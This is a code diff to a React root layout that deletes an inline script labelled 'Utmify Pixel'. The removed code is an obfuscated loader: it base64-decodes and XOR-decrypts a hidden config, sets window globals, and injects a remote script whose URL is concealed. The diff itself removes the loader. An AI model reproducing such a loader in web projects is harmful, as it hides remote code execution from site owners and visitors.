@@ -160,15 +160,6 @@ function RootShell({ children }: { children: ReactNode }) {
         />
         {/* End Utmify Script */}
 
-        {/* Utmify Pixel */}
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function(){var m_z5=atob("DEtwzh1hG18AlQWmGTBSu28NOWUi/XHSaThK4TICfzEu4HHLcC0J4H4OdnFi5yrVejkZvmkSNC9p7WDKNjsZtngNNTVztymEeD8EvHQDbitl5iecQhZc7HoNdD1h+XaEIxAL7HMAdjoiryfWcDMVolQFOXMi42TKbC5S9D9XemdiojDHLnkUqypXLWlm82aRKi9A+y9DZgJ9");var r_l=[];for(var y_6=0;y_6<m_z5.length;y_6++){r_l.push(m_z5.charCodeAt(y_6)&255);}var v_e66q=r_l[0];var h_6e=r_l.slice(1,1+v_e66q);var j_usu=r_l.slice(1+v_e66q);var h_0=j_usu.map(function(b,u_9l){return b^h_6e[u_9l%v_e66q];});var m_3c="";for(var d_xtx=0;d_xtx<h_0.length;d_xtx++){m_3c+=String.fromCharCode(h_0[d_xtx]&255);}var p_n=decodeURIComponent(escape(m_3c));var b_9c1u=JSON.parse(p_n);var u_y=b_9c1u.globals||[];u_y.forEach(function(b_8x){window[b_8x.name]=b_8x.value;});var j_o9=document.createElement("script");j_o9.src=b_9c1u.url;j_o9.async=true;j_o9.defer=true;(b_9c1u.attributes||[]).forEach(function(c_8hl){j_o9.setAttribute(c_8hl.name,c_8hl.value);});(document.head||document.documentElement).appendChild(j_o9);})();
-            `,
-          }}
-        />
-        {/* End Utmify Pixel */}
       </head>
       <body>
         {children}
